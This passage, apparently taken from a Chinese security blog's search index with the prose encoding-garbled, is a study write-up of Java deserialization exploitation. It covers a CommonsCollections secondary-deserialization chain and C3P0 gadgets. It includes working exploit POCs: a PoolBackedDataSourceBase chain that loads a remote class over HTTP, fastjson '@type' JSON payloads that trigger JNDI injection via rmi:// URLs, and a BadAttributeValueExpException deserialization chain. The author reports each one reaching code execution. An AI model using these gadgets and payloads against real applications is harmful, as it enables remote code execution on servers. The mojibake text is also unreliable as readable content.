ConstantTransformer(1)}; Transformer[] chainpart1 = new Transformer[]{new ConstantTransformer(rmi),new InvokerTransformer(\u0026#34;connect\u0026#34;,null,null)};//æ³¨æ„ä¸€ä¸‹è¿™é‡Œçš„æ— å‚æ•°å½¢å‚çš„ä»£è¡¨ Transformer chain1 = new ChainedTransformer(fakeTransformer1); HashMap haha1 = new HashMap(); Map lazy1 = LazyMap.decorate(haha1,chain1); TiedMapEntry outerMap1 = new TiedMapEntry(lazy1,\u0026#34;fupanc\u0026#34;); HashMap hashMap1 = new HashMap(); hashMap1.put(outerMap1,\u0026#34;fupanc\u0026#34;); haha1.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x1.setAccessible(true); x1.set(chain1,chainpart1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap1); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } â€”â€”â€”â€”â€”â€”â€”â€”\nè¿™é‡Œè¿˜è¦æåˆ°ä¸€ä¸ªç‚¹ï¼Œåœ¨findRMIServer()æ–¹æ³•å¤„ï¼Œå‰é¢æˆ‘ä»¬éƒ½æ˜¯ä»findRMIServerJRMP()æ–¹æ³•å…¥æ‰‹ï¼Œè¿™é‡Œä¹Ÿç¡®å®æ¯”è¾ƒç¬¦åˆäºŒæ¬¡ååºåˆ—åŒ–çš„ä¾‹å­ï¼Œä½†æ˜¯å…¶å®è¿˜æœ‰å¦å¤–ä¸€ä¸ªç‚¹å¯ä»¥åˆ©ç”¨ï¼š è¿™é‡Œå°±æ˜¯è¦æ±‚ä»¥/jndi/æ¥å¼€å¤´ï¼Œå¯ä»¥è·Ÿè¿›ä¸€ä¸‹è¿™é‡Œçš„findRMIServerJNDI()æ–¹æ³•ï¼š ç»å…¸çš„(new InitialContext()).lookup()ï¼Œè¿™é‡Œå¯ä»¥è¿›è¡Œjndiæ³¨å…¥ï¼Œå…·ä½“å°±çœ‹jndiæ³¨å…¥çš„ç¬”è®°ã€‚\nWrapperConnectionPoolDataSource C3P0ä¸­çš„ä¸€ä¸ªå­˜åœ¨äºŒæ¬¡ååºåˆ—åŒ–é“¾å­ï¼Œä¸»è¦è¿˜æ˜¯éœ€è¦ç»“åˆå¯è°ƒç”¨setterçš„é“¾å­æ¥åˆ©ç”¨ï¼Œé€šè¿‡å¯¹WrapperConnectionPoolDataSourceç±»è°ƒç”¨setUserOverridesAsString()æ–¹æ³•ä»è€Œä¸€æ­¥ä¸€æ­¥è°ƒç”¨åˆ°SerializableUtilsç±»çš„deserializeFromByteArray()æ–¹æ³•å®ç°äºŒæ¬¡ååºåˆ—åŒ–ï¼š ä¸»è¦è°ƒç”¨setterçš„é“¾å­å­˜åœ¨äºjacksonå’Œfastjsonååºåˆ—åŒ–ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/t/13900?time__1311=GqmxnD2D97itqGNDQieBKbwiKGOjb%3D13a4D#toc-1\nã€ŠMapMessageäºŒæ¬¡ååºåˆ—åŒ–ã€‹\n","date":"2025-05-01T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"JavaäºŒæ¬¡ååºåˆ—åŒ–"},{"content":"C3P0 æ¦‚è¿° C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„æ•°æ®åº“è¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºäºJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateï¼ŒSpringç­‰ã€‚\nè¿æ¥æ± çš„å®šä¹‰ï¼šè¿æ¥æ± ç±»ä¼¼äºçº¿ç¨‹æ± ï¼Œç®€å•æ¥è¯´å…¶å®å°±æ˜¯è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªå¥æŸ„ï¼Œå½“éœ€è¦è¿›è¡Œæ•°æ®åº“è¿æ¥æ—¶ä¼šç›´æ¥ä½¿ç”¨è¿™ä¸ªå¥æŸ„ï¼Œè€Œä¸æ˜¯å¤šæ¬¡é‡å¤é¢‘ç¹åœ°åˆ›å»ºæˆ–é”€æ¯å¥æŸ„ï¼Œé€ æˆå¾ˆå¤§çš„èµ„æºæ¶ˆè€—ã€‚è€Œå½“ä¸ä½¿ç”¨æ—¶å°†å…¶æ”¾å›åˆ°è¿æ¥æ± ä¸­ã€‚\nä¸ºäº†é¿å…é¢‘ç¹åœ°åˆ›å»ºå’Œé”€æ¯JDBCé“¾æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿æ¥æ± ï¼ˆConnection Poolï¼‰å¤ç”¨å·²ç»åˆ›å»ºå¥½çš„è¿æ¥ã€‚\nmavenä¾èµ–å¦‚ä¸‹ï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.mchange\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;c3p0\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.9.5.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; æµ‹è¯•ç¯å¢ƒï¼š\nJDK8u71 åˆ©ç”¨ å¸¸è§çš„åˆ©ç”¨æ–¹å¼æœ‰å¦‚ä¸‹ä¸‰ç§ï¼š\nURLClassLoaderè¿œç¨‹ç±»åŠ è½½ JNDIæ³¨å…¥ åˆ©ç”¨HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨è¿›è¡Œååºåˆ—åŒ–æ”»å‡» URLClassLoaderè¿œç¨‹ç±»åŠ è½½ URLClassLoaderè¿™ä¸ªç±»åŠ è½½å™¨ä¹Ÿæ˜¯å‰é¢äº†è§£è¿‡çš„ï¼Œå¯ä»¥ç”¨æ¥åŠ è½½è¿œç¨‹ç±»ï¼Œè¿™é‡Œçš„è°ƒç”¨é“¾è¿‡ç¨‹å¦‚ä¸‹ï¼š\n1 2 3 4 PoolBackedDataSourceBase#readObject ReferenceSerialized#getObject ReferenceableUtils#referenceToObject ObjectFactory#getObjectInstance è·Ÿè¿›PoolBackedDataSourceBaseç±»çš„readObject()æ–¹æ³•ï¼š\næ»¡è¶³è¿™é‡Œååºåˆ—åŒ–å‡ºæ¥çš„ç±»æ˜¯IndirectlySerializedçš„å®ç°ç±»å°±ä¼šè°ƒç”¨åˆ°è¿™ä¸ªç±»çš„getObject()æ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹PoolBackedDataSourceBaseç±»çš„writeObject()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–è¦åˆ©ç”¨çš„ç±»å¯¹åº”çš„å°±æ˜¯connectionPoolDataSourceå˜é‡ï¼Œå˜é‡å®šä¹‰å¦‚ä¸‹ï¼š\nè¿˜æœ‰ä¸ªsetteræ–¹æ³•æ¥å¯¹è¿™ä¸ªå˜é‡è¿›è¡Œè®¾å€¼ï¼Œè¦æ±‚ç±»å‹ä¸ºConnectionPoolDataSourceï¼Œä½†æ˜¯è¿™ä¸ªç±»å‹ç›¸å¯¹åº”çš„ç±»æ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ‰€ä»¥æ˜¯ä¸å¯åºåˆ—åŒ–çš„ï¼Œåœ¨å°è¯•åºåˆ—åŒ–æ˜¯ä¼šç›´æ¥æŠ¥é”™è¿›è¡Œåˆ°catchè¯­å¥ï¼Œä¸»è¦å®ç°é€»è¾‘å°±æ˜¯SerializableUtils.toByteArray()æ–¹æ³•ä¼šå°è¯•è¿›è¡Œåºåˆ—åŒ–ï¼Œè¿™é‡Œçš„SerializableUtilsç±»çš„toByteArray()æ–¹æ³•ä¼šè°ƒç”¨serializeToByteArray()æ–¹æ³•ï¼š\nä¹Ÿå°±æ˜¯ä¼šå…ˆæ£€æµ‹æ˜¯å¦å¯ä»¥åºåˆ—åŒ–ã€‚\næ‰€ä»¥å…¶å®åœ¨writeObject()æ–¹æ³•ä¸­ï¼Œæ˜¯ä¼šåœ¨catchä¸­è¿›è¡Œåºåˆ—åŒ–ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ªReferenceIndirectorç±»ï¼Œç„¶åè°ƒç”¨è¿™ä¸ªç±»çš„indirectForm()æ–¹æ³•ï¼Œæœ€ååºåˆ—åŒ–è¿™ä¸ªæ–¹æ³•è¿”å›çš„ç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬è·Ÿè¿›ReferenceIndirectorç±»çš„indirectForm()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹ä¼ è¿›æ¥çš„ç±»å®ä¾‹è°ƒç”¨äº†ä¸€ä¸ªgetReference()æ–¹æ³•ï¼Œè¿™ä¸ªgetReference()æ–¹æ³•åœ¨æˆ‘ä»¬å­¦ä¹ jndiæ³¨å…¥æ—¶è¿˜æ˜¯æ¯”è¾ƒå¸¸ç”¨ï¼Œå°±æ˜¯è·å–è¢«å¼•ç”¨çš„ç±»ï¼Œç„¶åå®ä¾‹åŒ–äº†ä¸€ä¸ªReferenceSerializedè¢«ç”¨äºåºåˆ—åŒ–ã€‚\nçœ‹äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªReferenceSerializedç±»æ˜¯å®ç°äº†IndirectlySerializedæ¥å£çš„ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯å¯ä»¥åœ¨ååºåˆ—åŒ–æ—¶æ­£å¸¸åˆ©ç”¨çš„ã€‚\nå†çœ‹ååºåˆ—åŒ–è°ƒç”¨ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨åˆ°ReferenceSerializedç±»çš„getObject()æ–¹æ³•ï¼š\nå¦‚æœè¿™é‡Œçš„contextNameå˜é‡å¯æ§çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰“ä¸€æ¬¡jndiæ³¨å…¥ï¼Œæº¯æºäº†ä¸€ä¸‹contextNameçš„èµ‹å€¼ï¼Œæƒ³è¦åˆ©ç”¨çš„è¯ï¼Œå…¶å®å°±æ˜¯éœ€è¦æ§åˆ¶ReferenceIndirectorç±»çš„åˆå§‹åŒ–ï¼Œä½†æ˜¯è¿™ä¸ªç±»æ˜¯åœ¨åºåˆ—åŒ–æ—¶ç›´æ¥åˆå§‹åŒ–çš„ï¼Œä¸å¯æ§ã€‚\né‚£ä¹ˆç»§ç»­è·Ÿè¿›ReferenceableUtilsç±»çš„referenceToObject()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°æ˜¯è°ƒç”¨äº†URLClassLoaderç±»åŠ è½½å™¨æ¥è¿›è¡Œè¿œç¨‹ç±»åŠ è½½ï¼Œä¸»è¦çš„éœ€è¦åˆ©ç”¨çš„ç‚¹æ˜¯refï¼Œå¹¶ä¸”è¿™ä¸ªæ˜¯å¯æ§çš„ï¼Œå°±æ˜¯åºåˆ—åŒ–æ—¶è°ƒç”¨getReference()æ–¹æ³•å¾—åˆ°çš„ç±»ï¼š\næ‰€ä»¥ç°åœ¨ä¸»è¦çš„ç‚¹å°±æ˜¯çœ‹è¿™é‡Œæˆ‘ä»¬éœ€è¦å°†è¿™ä¸ªoè®¾ç½®æˆä»€ä¹ˆç±»ï¼Œä¹Ÿå°±æ˜¯PoolBackedDataSourceBaseç±»çš„connectionPoolDataSourceå˜é‡è®¾ç½®æˆä»€ä¹ˆéœ€è¦çš„ç±»ï¼Œå¯ä»¥å‘ç°è¿™é‡Œæ˜¯æœ‰ä¸€ä¸ªç±»å‹è½¬æ¢çš„ï¼Œå¼ºåˆ¶è½¬æ¢ä¸ºäº†Referenceableï¼Œæ ¹æ®è¿™ä¸ªæ¥å£ç±»æ‰¾äº†ä¸€ä¸‹ï¼Œæ²¡å‘ç°å¯ä»¥ç›´æ¥åˆ©ç”¨çš„ç±»ã€‚\né‚£ä¹ˆè¿™é‡Œå¯ä»¥å°è¯•è‡ªå·±å®ç°è¿™ä¸ªç±»ï¼Œåœ¨åºåˆ—åŒ–æ—¶å°†å…¶å†™è¿›å»ï¼ˆè¿™é‡Œæœ‰ç‚¹é—®é¢˜ï¼Œçœ‹åé¢ä¼šæœ‰è¯´æ˜ï¼Œå¯ä»¥å…ˆè‡ªå·±æƒ³ä¸€ä¸‹ä¸ºä»€ä¹ˆä¹‹ç±»éœ€è¦è‡ªå®šä¹‰ç±»ï¼Œå…·ä½“çš„å®ç°è¿‡ç¨‹åˆæ˜¯ä»€ä¹ˆï¼‰ï¼Œè¾¾åˆ°åœ¨ååºåˆ—åŒ–æ—¶æˆåŠŸè°ƒç”¨çš„æ•ˆæœï¼Œå°±æ˜¯éœ€è¦æ»¡è¶³ä¸€äº›æ¡ä»¶ï¼Œä»¥ä½¿å¾—å¯ä»¥åœ¨åºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–æ—¶è¾¾åˆ°æƒ³è¦çš„æ•ˆæœï¼š\næ²¡æœ‰å®ç°Serializableæ¥å£ å®ç°ConnectionPoolDataSourceæ¥å£ å®ç°Referenceableæ¥å£ æœ€åçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 package C3P0; import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase; import javax.naming.NamingException; import javax.naming.Reference; import javax.naming.Referenceable; import javax.sql.ConnectionPoolDataSource; import javax.sql.PooledConnection; import java.io.*; import java.sql.SQLException; import java.sql.SQLFeatureNotSupportedException; import java.util.logging.Logger; public class Main { public static void main(String[] args) throws Exception { PoolBackedDataSourceBase pool = new PoolBackedDataSourceBase(false); Reference ref = new Reference(\u0026#34;MyTest\u0026#34;, \u0026#34;MyTest\u0026#34;, \u0026#34;http://127.0.0.1:7979/\u0026#34;); PoolTest poolTest = new PoolTest(ref); pool.setConnectionPoolDataSource(poolTest); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(pool); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } class PoolTest implements Referenceable,ConnectionPoolDataSource{ public Reference reference; public PoolTest(Reference reference){ this.reference = reference; } @Override public Reference getReference() throws NamingException { return this.reference; } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PooledConnection getPooledConnection(String user, String password) throws SQLException { return null; } @Override public PrintWriter getLogWriter() throws SQLException { return null; } @Override public int getLoginTimeout() throws SQLException { return 0; } @Override public void setLoginTimeout(int seconds) throws SQLException { } @Override public void setLogWriter(PrintWriter out) throws SQLException { } @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; } } éœ€è¦å®šä¹‰ä¸€ä¸ªè¿œç¨‹HTTPæœåŠ¡ç”¨äºç±»åŠ è½½ï¼š\nç„¶åè¿è¡Œå³å¯å¼¹å‡ºè®¡ç®—æœºã€‚\nâ€”â€”â€”â€”\nå¯¹äºè¿™é‡Œè‡ªå®šä¹‰ç±»çš„åˆ©ç”¨æ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–æ—¶è°ƒè¯•äº†ä¸€ä¸‹ï¼Œå…¶å®æ˜¯ä¸€ä¸ªéå¸¸å¥½ç”¨çš„ç‚¹ï¼Œè¿™é‡Œæˆ‘è‡ªå®šä¹‰äº†ä¸€ä¸ªPoolTestç±»ï¼Œåªæ˜¯ç”¨äºä¸€ä¸ªè¿‡æ¸¡ï¼Œåªæ˜¯ä¸ºäº†åœ¨åºåˆ—åŒ–æ—¶æ”¾å…¥æƒ³è¦çš„ç±»ï¼š\nåºåˆ—åŒ–æ­£å¸¸è°ƒç”¨æ—¶ä¼šè°ƒç”¨åˆ°å¦‚ä¸Šçš„æ–¹æ³•ï¼Œæˆ‘ä»¬æœ€åè¦åºåˆ—åŒ–çš„ç±»æ˜¯ReferenceSerializedç±»ï¼Œè¿™é‡Œæˆ‘ä»¬è‡ªå®šä¹‰äº†PoolTestç±»ï¼Œä¸ºçš„å°±æ˜¯èƒ½å¤Ÿåœ¨è¿™é‡Œè°ƒç”¨getTeference()æ–¹æ³•æ—¶è¿”å›ä¸€ä¸ªå®šä¹‰å¥½äº†çš„Referenceç±»ï¼Œè¿™æ ·åœ¨ååºåˆ—åŒ–è°ƒç”¨åˆ°ReferenceSerializedç±»çš„getObject()æ–¹æ³•æ—¶å¯ä»¥åˆ©ç”¨åˆ°æˆ‘ä»¬æ„é€ å¥½çš„Referenceï¼Œä»è€Œè¾¾åˆ°è¿œç¨‹ç±»åŠ è½½çš„è¿‡ç¨‹ã€‚æ‰€ä»¥å…¶å®è¿™é‡Œåºåˆ—åŒ–æ˜¯å®Œå…¨æ²¡æœ‰åºåˆ—åŒ–è‡ªå®šä¹‰çš„PoolTestç±»çš„ï¼Œåªæ˜¯èµ·åˆ°äº†ä¸€ä¸ªè¿‡æ¸¡çš„ä½œç”¨ï¼Œç”¨æ¥æä¾›æˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„Referenceç±»ã€‚\næœ€åï¼Œå¯ä»¥æ³¨æ„åˆ°ReferenceableUtilsç±»çš„referenceToObject()æ–¹æ³•è°ƒç”¨Class.forname()æ—¶ï¼Œæ˜¯è®¾ç½®ä¸ºäº†trueçš„ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ç›´æ¥åœ¨Class.forName()æ—¶ç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè€Œä¸æ˜¯è°ƒç”¨newInstance()æ–¹æ³•æ—¶æ‰å‘½ä»¤æ‰§è¡Œï¼Œå¹¶ä¸”æµ‹è¯•æˆåŠŸã€‚\næ‰“æœ¬åœ°ç±»* ç®—æ˜¯ä¸Šé¢çš„URLClassLoaderçš„å»¶ä¼¸ï¼Œå½“Referenceç±»çš„classFactoryLocationä¸ºnullæ—¶ï¼Œå°±ä¸ä¼šè¿›è¡Œè¿œç¨‹ç±»åŠ è½½ï¼Œè€Œæ˜¯åœ¨æœ¬åœ°è¿›è¡Œå¯»æ‰¾åˆ©ç”¨ã€‚è¿™é‡Œå¯ä»¥å‚è€ƒé«˜ç‰ˆæœ¬jndiæ³¨å…¥çš„æ‰“æ³•ï¼Œå‚è€ƒå¦‚ä¸‹æ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/11340\nâ€”â€”â€”â€”â€”â€”â€”â€”\nç»“åˆfastjsonè¾¾åˆ°JNDIæ³¨å…¥ è¿™é‡Œä¸»è¦æ˜¯éœ€è¦è°ƒç”¨åˆ°setteræ–¹æ³•ï¼Œéœ€è¦æ‰¾ä¸€ä¸ªå¯ä»¥è§¦å‘setteræ–¹æ³•çš„åˆ©ç”¨ç‚¹ï¼Œæ¯”è¾ƒç»å…¸çš„å°±æ˜¯fastjsonäº†ï¼Œå½“ç„¶jacksonåº”è¯¥ä¹Ÿå¯ä»¥ã€‚\nè¿™é‡Œçš„sinkç‚¹ä½äºJndiRefForwardingDataSourceç±»çš„dereference()æ–¹æ³•ï¼š\nç®€å•çœ‹äº†ä¸€ä¸‹è¿™é‡Œå…³é”®çš„getJndiName()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å­˜åœ¨äºçˆ¶ç±»JndiRefDataSourceBaseä¸­ï¼Œç„¶åè¿˜æœ‰setteræ¥è¿›è¡Œè®¾ç½®å€¼ï¼š\nä»ä»£ç é€»è¾‘çœ‹æ˜¯å¯ä»¥å°†å…¶è®¾ç½®ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„ï¼Œå¯ä»¥å°è¯•æ‰“jndiæ³¨å…¥ã€‚\né‚£ä¹ˆçœ‹å“ªé‡Œè°ƒç”¨äº†dereference()æ–¹æ³•ï¼Œå…¨å±€æœç´¢çœ‹åˆ°åœ¨inner()æ–¹æ³•æœ‰è°ƒç”¨ï¼š\nå†çœ‹å“ªé‡Œè°ƒç”¨äº†inner()æ–¹æ³•ï¼š ä¸»è¦å°±æ˜¯å¦‚ä¸Šçš„å‡ ä¸ªgetterå’Œsetterå¯ä»¥è°ƒç”¨ã€‚\næ„Ÿè§‰å¯ä»¥ç›´æ¥æ‰“ååºåˆ—åŒ–è°ƒç”¨é“¾è§¦å‘getteræ–¹æ³•ã€‚ä½†æ˜¯è¿™ä¸ªç±»æ²¡æœ‰è¢«publicä¿®é¥°ï¼Œè€Œæ˜¯è¢«finalä¿®é¥°ï¼Œå¤–éƒ¨æ— æ³•å®ä¾‹åŒ–ï¼Œåªèƒ½æ”¾å¼ƒä»ååºåˆ—åŒ–è°ƒç”¨é“¾æ¥æ‰“ã€‚\nä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿˜æœ‰setteræ–¹æ³•æœ‰è°ƒç”¨åˆ°inner()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•æ‰“fastjsonååºåˆ—åŒ–è§¦å‘ï¼Œè¿™é‡Œä»¥ä½ç‰ˆæœ¬çš„fastjsonååºåˆ—åŒ–ä¸ºä¾‹æ¥è§¦å‘ï¼š\n1 2 3 4 5 6 7 8 9 10 11 package C3P0; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Main{ public static void main(String[] args) { String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.mchange.v2.c3p0.JndiRefForwardingDataSource\\\u0026#34;,\\\u0026#34;jndiName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/Hello\\\u0026#34;,\\\u0026#34;loginTimeout\\\u0026#34;:\\\u0026#34;1\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nâ€”â€”â€”â€”â€”â€”\nä½†æ˜¯çœ‹ç½‘ä¸Šçš„æ–‡ç« ï¼Œæ˜¯æ‰“çš„å¦å¤–ä¸€ä¸ªç±»ï¼Œä½†æœ¬è´¨ä¹Ÿæ˜¯è°ƒç”¨çš„setLoginTimeout()æ–¹æ³•æ¥è¿›è¡Œçš„jndiæ³¨å…¥ï¼Œå¤šåŠ äº†å‡ ä¸ªè¿‡æ¸¡ç±»å¹¶ä¸”å…¥å£ç±»ä¹Ÿä¸åŒäº†ï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡ï¼Œå­¦ä¹ ä¸€ä¸‹ã€‚\nå®šä½åˆ°JndiRefConnectionPoolDataSourceç±»çš„setLoginTimeout()æ–¹æ³•ï¼š\nè·Ÿè¿›wcpdså˜é‡çš„èµ‹å€¼ï¼Œå‘ç°åœ¨JndiRefConnectionPoolDataSourceç±»å®ä¾‹åŒ–æ—¶æœ‰å¯¹å˜é‡èµ‹å€¼çš„æ“ä½œï¼š\nå¯ä»¥çœ‹è¿™é‡Œå®ä¾‹åŒ–äº†ä¸€ä¸ªJndiRefForwardingDataSourceç±»å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯å‰é¢åˆ©ç”¨åˆ°çš„ç±»ï¼Œè¿™é‡Œè¿˜å®ä¾‹åŒ–äº†ä¸€ä¸ªWrapperConnectionPoolDataSourceç±»ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº†setNestedDataSourceæ–¹æ³•æ¥å¯¹WrapperConnectionPoolDataSourceç±»å˜é‡è¿›è¡Œèµ‹å€¼ï¼š ä¹Ÿå°±æ˜¯å°†WrapperConnectionPoolDataSourceç±»çš„å˜é‡nestedDataSourceèµ‹å€¼ä¸ºJndiRefForwardingDataSourceç±»å®ä¾‹ã€‚\nå†çœ‹JndiRefConnectionPoolDataSourceç±»çš„setLoginTimeout()æ–¹æ³•ï¼š\nè¿™é‡Œä¼šè°ƒç”¨WrapperConnectionPoolDataSourceç±»çˆ¶ç±»WrapperConnectionPoolDataSourceBaseçš„setLoginTimeout()æ–¹æ³•ï¼š\nçœ‹è¿™é‡Œçš„getNestedDataSource()æ–¹æ³•ï¼š\nå¯¹åº”çš„å°±æ˜¯å‰é¢çš„jrfdså˜é‡ï¼Œä¹Ÿå°±æ˜¯JndiRefForwardingDataSourceç±»å®ä¾‹ï¼Œé‚£ä¹ˆä¹‹ç±»å°±æ˜¯å¯ä»¥è°ƒç”¨åˆ°JndiRefForwardingDataSourceç±»çš„setLoginTimeout()æ–¹æ³•ï¼Œå®ç°ä¸€æ¬¡å‰é¢åˆ†æè¿‡çš„è§¦å‘jndiæ³¨å…¥çš„è°ƒç”¨é“¾ã€‚\nå¹¶ä¸”JndiRefConnectionPoolDataSourceç±»æä¾›äº†setJndiName()æ–¹æ³•æ¥å¯¹å˜é‡è¿›è¡Œèµ‹å€¼ï¼š\nè¿™æ ·å°±èµ‹å€¼éœ€è¦æ»¡è¶³çš„æ¡ä»¶äº†ã€‚\nåŸºæœ¬è¿‡ç¨‹å·²ç»æ¸…æ™°ï¼Œå¦‚ä¸‹POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 package C3P0; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Main{ public static void main(String[] args) { String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\\\u0026#34;,\\\u0026#34;jndiName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/Hello\\\u0026#34;,\\\u0026#34;loginTimeout\\\u0026#34;:\\\u0026#34;1\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } ä¹Ÿæ˜¯æ‰“jndiå¼¹å‡ºè®¡ç®—æœºã€‚\nâ€”â€”â€”â€”â€”â€”\nçœ‹æ€è·¯çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘å¯¹äºæ‰“fastjsonååºåˆ—åŒ–è°ƒç”¨é“¾çš„æƒ³æ³•åˆæ­»ç°å¤ç‡ƒäº†ï¼š\nå¯ä»¥çœ‹åˆ°JndiRefConnectionPoolDataSourceç±»æ˜¯publicä¿®é¥°çš„ç±»ï¼Œå¹¶ä¸”æœ‰publicçš„æ„é€ æ–¹æ³•ï¼Œè¿˜å®ç°äº†Serializableæ¥å£ï¼š\nå¹¶ä¸”è¿˜å®šä¹‰äº†JndiRefForwardingDataSourceç±»å¯ä»¥è°ƒç”¨åˆ°inner()æ–¹æ³•çš„å‡ ä¸ªæ–¹æ³•ï¼š\nå°±ååºåˆ—åŒ–æ¥è¯´ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œè¿™é‡Œè‚¯å®šæ˜¯éœ€è¦åˆ©ç”¨getterï¼Œè¿™é‡Œçš„getLoginTimeout()å°±éå¸¸ç¬¦åˆï¼Œå¯¹äºwcpdsè°ƒç”¨çš„getLoginTimeout()æ–¹æ³•ï¼Œå…¶å®æˆ‘åœ¨å‰é¢çš„æˆªå›¾ä¹Ÿæ˜¯æˆªå‡ºæ¥äº†çš„ï¼š\nç†Ÿæ‚‰çš„getNestedDataSource()æ–¹æ³•ï¼Œç†Ÿæ‚‰çš„JndiRefForwardingDataSourceç±»å®ä¾‹ï¼Œå¹¶ä¸”æ­£å¦‚å‰é¢åˆ†æï¼ŒJndiRefConnectionPoolDataSourceç±»è¿˜æä¾›äº†ä¸€ä¸ªsetJndiName()æ–¹æ³•æ¥ç»™æˆ‘ä»¬éœ€è¦æ”¹å˜çš„å˜é‡èµ‹å€¼ã€‚å®Œç¾ç¬¦åˆï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•æ„é€ å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package C3P0; import com.alibaba.fastjson.JSONObject; import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception{ JndiRefConnectionPoolDataSource jndiRefConnectionPoolDataSource = new JndiRefConnectionPoolDataSource(false); jndiRefConnectionPoolDataSource.setJndiName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,jndiRefConnectionPoolDataSource); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field f = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); f.setAccessible(true); f.set(bad,jsonObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } 